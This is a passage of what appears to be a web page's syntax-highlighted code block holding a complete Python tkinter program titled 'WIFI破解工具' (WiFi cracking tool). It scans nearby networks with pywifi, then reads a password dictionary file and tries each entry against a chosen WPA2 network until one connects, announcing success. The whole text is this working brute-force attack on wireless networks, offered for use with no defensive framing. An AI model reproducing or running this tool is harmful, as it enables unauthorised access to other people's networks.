+<span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox
+ 
+<span class="token keyword">class</span> <span class="token class-name">MY_GUI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_window_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		self<span class="token punctuation">.</span>init_window_name <span class="token operator">=</span> init_window_name
+		
+		<span class="token comment">#密码文件路径</span>
+		self<span class="token punctuation">.</span>get_value <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		
+		<span class="token comment">#获取破解wifi账号</span>
+		self<span class="token punctuation">.</span>get_wifi_value <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		
+		<span class="token comment">#获取wifi密码</span>
+		self<span class="token punctuation">.</span>get_wifimm_value <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>wifi <span class="token operator">=</span> pywifi<span class="token punctuation">.</span>PyWiFi<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#抓取网卡接口</span>
+		self<span class="token punctuation">.</span>iface <span class="token operator">=</span> self<span class="token punctuation">.</span>wifi<span class="token punctuation">.</span>interfaces<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">#抓取第一个无线网卡</span>
+		self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>disconnect<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#测试链接断开所有链接</span>
+		time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">#休眠1秒</span>
+		<span class="token comment">#测试网卡是否属于断开状态</span>
+		<span class="token keyword">assert</span> self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span>\
+				<span class="token punctuation">[</span>const<span class="token punctuation">.</span>IFACE_DISCONNECTED<span class="token punctuation">,</span> const<span class="token punctuation">.</span>IFACE_INACTIVE<span class="token punctuation">]</span>
+	
+	<span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token string">'(WIFI:%s,%s)'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>wifi<span class="token punctuation">,</span>self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		
+	<span class="token comment">#设置窗口</span>
+	<span class="token keyword">def</span> <span class="token function">set_init_window</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		self<span class="token punctuation">.</span>init_window_name<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">&quot;WIFI破解工具&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>init_window_name<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+200'</span><span class="token punctuation">)</span>
+		
+		labelframe <span class="token operator">=</span> LabelFrame<span class="token punctuation">(</span>width<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;配置&quot;</span><span class="token punctuation">)</span>
+		labelframe<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>search <span class="token operator">=</span> Button<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;搜索附近WiFi&quot;</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>scans_wifi_list<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>pojie <span class="token operator">=</span> Button<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;开始破解&quot;</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>readPassWord<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>label <span class="token operator">=</span> Label<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;目录路径：&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>path <span class="token operator">=</span> Entry<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>textvariable <span class="token operator">=</span> self<span class="token punctuation">.</span>get_value<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span><span class="token builtin">file</span> <span class="token operator">=</span> Button<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;添加密码文件目录&quot;</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>add_mm_file<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>wifi_text <span class="token operator">=</span> Label<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;WiFi账号：&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>wifi_input <span class="token operator">=</span> Entry<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>textvariable <span class="token operator">=</span> self<span class="token punctuation">.</span>get_wifi_value<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>wifi_mm_text <span class="token operator">=</span> Label<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">&quot;WiFi密码：&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>wifi_mm_input <span class="token operator">=</span> Entry<span class="token punctuation">(</span>labelframe<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>textvariable <span class="token operator">=</span> self<span class="token punctuation">.</span>get_wifimm_value<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>W<span class="token punctuation">)</span>
+		
+		self<span class="token punctuation">.</span>wifi_labelframe <span class="token operator">=</span> LabelFrame<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">&quot;wifi列表&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_labelframe<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>NSEW<span class="token punctuation">)</span>
+		
+		
+		<span class="token comment"># 定义树形结构与滚动条</span>
+		self<span class="token punctuation">.</span>wifi_tree <span class="token operator">=</span> ttk<span class="token punctuation">.</span>Treeview<span class="token punctuation">(</span>self<span class="token punctuation">.</span>wifi_labelframe<span class="token punctuation">,</span>show<span class="token operator">=</span><span class="token string">&quot;headings&quot;</span><span class="token punctuation">,</span>columns<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;d&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		
+		self<span class="token punctuation">.</span>vbar <span class="token operator">=</span> ttk<span class="token punctuation">.</span>Scrollbar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>wifi_labelframe<span class="token punctuation">,</span> orient<span class="token operator">=</span>VERTICAL<span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>yview<span class="token punctuation">)</span>       
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>yscrollcommand<span class="token operator">=</span>self<span class="token punctuation">.</span>vbar<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">)</span>
+		
+		<span class="token comment"># 表格的标题</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>column<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> anchor<span class="token operator">=</span><span class="token string">&quot;center&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>column<span class="token punctuation">(</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> anchor<span class="token operator">=</span><span class="token string">&quot;center&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>column<span class="token punctuation">(</span><span class="token string">&quot;c&quot;</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> anchor<span class="token operator">=</span><span class="token string">&quot;center&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>column<span class="token punctuation">(</span><span class="token string">&quot;d&quot;</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> anchor<span class="token operator">=</span><span class="token string">&quot;center&quot;</span><span class="token punctuation">)</span>
+         
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>heading<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">&quot;WiFiID&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>heading<span class="token punctuation">(</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">&quot;SSID&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>heading<span class="token punctuation">(</span><span class="token string">&quot;c&quot;</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">&quot;BSSID&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>heading<span class="token punctuation">(</span><span class="token string">&quot;d&quot;</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">&quot;signal&quot;</span><span class="token punctuation">)</span>
+        
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>NSEW<span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">&quot;&lt;Double-1&gt;&quot;</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>onDBClick<span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>vbar<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>NS<span class="token punctuation">)</span>
+		
+	<span class="token comment">#搜索wifi</span>
+	<span class="token comment">#cmd /k C:\Python27\python.exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; PAUSE &amp; EXIT</span>
+	<span class="token keyword">def</span> <span class="token function">scans_wifi_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 扫描周围wifi列表</span>
+		<span class="token comment">#开始扫描</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;^_^ 开始扫描附近wifi...&quot;</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>scan<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
+		<span class="token comment">#在若干秒后获取扫描结果</span>
+		scanres <span class="token operator">=</span> self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>scan_results<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token comment">#统计附近被发现的热点数量</span>
+		nums <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>scanres<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;数量: %s&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token comment">#print (&quot;| %s |  %s |  %s | %s&quot;%(&quot;WIFIID&quot;,&quot;SSID&quot;,&quot;BSSID&quot;,&quot;signal&quot;))</span>
+		<span class="token comment"># 实际数据</span>
+		self<span class="token punctuation">.</span>show_scans_wifi_list<span class="token punctuation">(</span>scanres<span class="token punctuation">)</span>
+		<span class="token keyword">return</span> scanres
+	
+	<span class="token comment">#显示wifi列表</span>
+	<span class="token keyword">def</span> <span class="token function">show_scans_wifi_list</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>scans_res<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">for</span> index<span class="token punctuation">,</span>wifi_info <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>scans_res<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># print(&quot;%-*s| %s | %*s |%*s\n&quot;%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))</span>
+			self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">'end'</span><span class="token punctuation">,</span>values<span class="token operator">=</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>wifi_info<span class="token punctuation">.</span>ssid<span class="token punctuation">,</span>wifi_info<span class="token punctuation">.</span>bssid<span class="token punctuation">,</span>wifi_info<span class="token punctuation">.</span>signal<span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token comment">#print(&quot;| %s | %s | %s | %s \n&quot;%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))</span>
+	
+	<span class="token comment">#添加密码文件目录</span>
+	<span class="token keyword">def</span> <span class="token function">add_mm_file</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		self<span class="token punctuation">.</span>filename <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>filedialog<span class="token punctuation">.</span>askopenfilename<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>get_value<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
+	
+	<span class="token comment">#Treeview绑定事件</span>
+	<span class="token keyword">def</span> <span class="token function">onDBClick</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		self<span class="token punctuation">.</span>sels<span class="token operator">=</span> event<span class="token punctuation">.</span>widget<span class="token punctuation">.</span>selection<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>get_wifi_value<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>wifi_tree<span class="token punctuation">.</span>item<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sels<span class="token punctuation">,</span><span class="token string">&quot;values&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+		<span class="token comment">#print(&quot;you clicked on&quot;,self.wifi_tree.item(self.sels,&quot;values&quot;)[1])</span>
+	
+	<span class="token comment">#读取密码字典，进行匹配</span>
+	<span class="token keyword">def</span> <span class="token function">readPassWord</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		self<span class="token punctuation">.</span>getFilePath <span class="token operator">=</span> self<span class="token punctuation">.</span>get_value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token comment">#print(&quot;文件路径：%s\n&quot; %(self.getFilePath))</span>
+		self<span class="token punctuation">.</span>get_wifissid <span class="token operator">=</span> self<span class="token punctuation">.</span>get_wifi_value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token comment">#print(&quot;ssid：%s\n&quot; %(self.get_wifissid))</span>
+		self<span class="token punctuation">.</span>pwdfilehander<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>getFilePath<span class="token punctuation">,</span><span class="token string">&quot;r&quot;</span><span class="token punctuation">,</span>errors<span class="token operator">=</span><span class="token string">&quot;ignore&quot;</span><span class="token punctuation">)</span>
+		<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+				<span class="token keyword">try</span><span class="token punctuation">:</span>
+					self<span class="token punctuation">.</span>pwdStr <span class="token operator">=</span>self<span class="token punctuation">.</span>pwdfilehander<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+					<span class="token comment">#print(&quot;密码: %s &quot; %(self.pwdStr))</span>
+					<span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>pwdStr<span class="token punctuation">:</span>
+						<span class="token keyword">break</span>
+					self<span class="token punctuation">.</span>bool1<span class="token operator">=</span>self<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pwdStr<span class="token punctuation">,</span>self<span class="token punctuation">.</span>get_wifissid<span class="token punctuation">)</span>
+					<span class="token comment">#print(&quot;返回值：%s\n&quot; %(self.bool1) )</span>
+					<span class="token keyword">if</span> self<span class="token punctuation">.</span>bool1<span class="token punctuation">:</span>
+						<span class="token comment"># print(&quot;密码正确：&quot;+pwdStr</span>
+						<span class="token comment"># res = &quot;密码:%s 正确 \n&quot;%self.pwdStr;</span>
+						self<span class="token punctuation">.</span>res <span class="token operator">=</span> <span class="token string">&quot;===正确===  wifi名:%s  匹配密码：%s &quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_wifissid<span class="token punctuation">,</span>self<span class="token punctuation">.</span>pwdStr<span class="token punctuation">)</span>
+						self<span class="token punctuation">.</span>get_wifimm_value<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>pwdStr<span class="token punctuation">)</span>
+						tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">'提示'</span><span class="token punctuation">,</span> <span class="token string">'破解成功！！！'</span><span class="token punctuation">)</span>
+						<span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>res<span class="token punctuation">)</span>
+						<span class="token keyword">break</span>
+					<span class="token keyword">else</span><span class="token punctuation">:</span>
+						<span class="token comment"># print(&quot;密码:&quot;+self.pwdStr+&quot;错误&quot;)</span>
+						self<span class="token punctuation">.</span>res <span class="token operator">=</span> <span class="token string">&quot;---错误--- wifi名:%s匹配密码：%s&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_wifissid<span class="token punctuation">,</span>self<span class="token punctuation">.</span>pwdStr<span class="token punctuation">)</span>
+						<span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>res<span class="token punctuation">)</span>
+					sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+				<span class="token keyword">except</span><span class="token punctuation">:</span>
+					<span class="token keyword">continue</span>
+	
+	<span class="token comment">#对wifi和密码进行匹配</span>
+	<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>pwd_Str<span class="token punctuation">,</span>wifi_ssid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token comment">#创建wifi链接文件</span>
+		self<span class="token punctuation">.</span>profile <span class="token operator">=</span> pywifi<span class="token punctuation">.</span>Profile<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		self<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>ssid <span class="token operator">=</span>wifi_ssid <span class="token comment">#wifi名称</span>
+		self<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>auth <span class="token operator">=</span> const<span class="token punctuation">.</span>AUTH_ALG_OPEN  <span class="token comment">#网卡的开放</span>
+		self<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>akm<span class="token punctuation">.</span>append<span class="token punctuation">(</span>const<span class="token punctuation">.</span>AKM_TYPE_WPA2PSK<span class="token punctuation">)</span><span class="token comment">#wifi加密算法</span>
+		self<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>cipher <span class="token operator">=</span> const<span class="token punctuation">.</span>CIPHER_TYPE_CCMP    <span class="token comment">#加密单元</span>
+		self<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>key <span class="token operator">=</span> pwd_Str <span class="token comment">#密码</span>
+		self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>remove_all_network_profiles<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#删除所有的wifi文件</span>
+		self<span class="token punctuation">.</span>tmp_profile <span class="token operator">=</span> self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>add_network_profile<span class="token punctuation">(</span>self<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token comment">#设定新的链接文件</span>
+		self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>tmp_profile<span class="token punctuation">)</span><span class="token comment">#链接</span>
+		time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+		<span class="token keyword">if</span> self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> const<span class="token punctuation">.</span>IFACE_CONNECTED<span class="token punctuation">:</span>  <span class="token comment">#判断是否连接上</span>
+			isOK<span class="token operator">=</span><span class="token boolean">True</span>   
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			isOK<span class="token operator">=</span><span class="token boolean">False</span>
+		self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>disconnect<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#断开</span>
+		time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+		<span class="token comment">#检查断开状态</span>
+		<span class="token keyword">assert</span> self<span class="token punctuation">.</span>iface<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span>\
+				<span class="token punctuation">[</span>const<span class="token punctuation">.</span>IFACE_DISCONNECTED<span class="token punctuation">,</span> const<span class="token punctuation">.</span>IFACE_INACTIVE<span class="token punctuation">]</span>
+		<span class="token keyword">return</span> isOK
+		
+<span class="token keyword">def</span> <span class="token function">gui_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	init_window <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	ui <span class="token operator">=</span> MY_GUI<span class="token punctuation">(</span>init_window<span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>ui<span class="token punctuation">)</span>
+	ui<span class="token punctuation">.</span>set_init_window<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token comment">#ui.scans_wifi_list()</span>
+	
+	init_window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	
+gui_start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span 